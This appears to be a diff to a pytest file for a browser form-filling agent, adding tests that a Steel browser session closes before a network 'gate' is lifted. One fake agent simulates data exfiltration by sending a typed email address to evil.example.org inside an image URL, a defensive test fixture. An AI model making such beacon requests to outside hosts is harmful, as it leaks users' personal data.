@@ -38,6 +38,7 @@ def world(monkeypatch, brain_db):  # noqa: F811
     brain_db["sandy_users"].insert_one({"_id": "userA"})
     browser_sites.init_browser_sites(brain_db)
     w = NS(snapshot=FORM, clients=[], opened=[], released=[], mode="submit", sent_notes=[], pressed=[], here=True,
+           order=[], refuse=0, shut=set(),
            filled=[{"field": "Name", "value": "Nabeel"}, {"field": "Email", "value": "n@example.com"}],
            result="<html><body><main><p>Thanks Nabeel, your application 77 was received.</p></main></body></html>")
 
@@ -95,6 +96,12 @@ def world(monkeypatch, brain_db):  # noqa: F811
         client.answers["Runtime.callFunctionOn"] = spot
         client.answers["Input.dispatchMouseEvent"] = press(client)
         client.answers["DOM.getNodeForLocation"] = {"backendNodeId": 7, "frameId": "f1"}
+        stop = client.stop
+
+        async def stopped():
+            w.order.append("stop")
+            await stop()
+        client.stop = stopped
         w.clients.append(client)
         return client
 
@@ -115,7 +122,17 @@ def world(monkeypatch, brain_db):  # noqa: F811
     monkeypatch.setattr(browser_job, "AGENT", agent)
     monkeypatch.setattr(steel_client, "create_session", lambda: w.opened.append(1) or {
         "id": f"st{len(w.opened)}", "debug_url": "https://api.steel.dev/v1/sessions/st1/player"})
-    monkeypatch.setattr(steel_client, "release", lambda sid, seconds=0: w.released.append(sid))
+
+    def release(sid, seconds=0):
+        w.released.append(sid)
+        w.order.append("release")
+        if w.refuse:
+            w.refuse -= 1
+            return False
+        w.shut.add(sid)
+        return True
+    monkeypatch.setattr(steel_client, "release", release)
+    monkeypatch.setattr(steel_client, "closed", lambda sid: sid in w.shut, raising=False)
     monkeypatch.setattr(notify, "CHANNELS", [lambda r: w.sent_notes.append(r["body"])])
     running, real_run = [], browser_job._run
 
@@ -786,3 +803,45 @@ def test_another_version_of_the_library_never_fills(world, monkeypatch):
     monkeypatch.setattr(importlib.metadata, "version", lambda name: "0.14.0" if name == "browser-use" else real(name))
     out = _fill("en")
     assert out["ok"] is False and world.opened == []
+
+
+# ── Steel closes the session before the gate comes off ──
+
+def _leaks(row, gate, client, tab, user_id, asked):
+    async def run():
+        gate.acted("type", "n@example.com")
+        gate.decide("GET", "https://evil.example.org/p.gif?e=n@example.com", "Image")
+        await asyncio.sleep(5)
+    return run()
+
+
+def _breaks(row, gate, client, tab, user_id, asked):
+    async def run():
+        raise RuntimeError("the agent broke")
+    return run()
+
+
+@pytest.mark.parametrize("how", ["end", "leak", "error", "stop"])
+def test_whatever_stops_a_fill_steel_closes_it_before_the_gate_comes_off(world, monkeypatch, how):
+    _level("submit")
+    if how == "leak":
+        monkeypatch.setattr(browser_job, "AGENT", _leaks)
+    if how == "error":
+        monkeypatch.setattr(browser_job, "AGENT", _breaks)
+    asked = _fill("en")
+    if how == "end":
+        _fill("en", confirmed_job=asked["ids"][0])
+    if how == "stop":
+        with active_user_profile_context(A):
+            stop_all.stop("userA")
+        _wait_for(lambda: "stop" in world.order)
+    assert world.order == ["release", "stop"], world.order
+
+
+def test_a_session_steel_does_not_close_keeps_its_gate_until_it_does(world, monkeypatch):
+    _level("submit")
+    monkeypatch.setattr(browser_job, "AGENT", _leaks)
+    monkeypatch.setattr(browser_job, "SHUT_S", 0.05)
+    world.refuse = 2
+    _fill("en")
+    assert world.order == ["release", "release", "release", "stop"], world.order
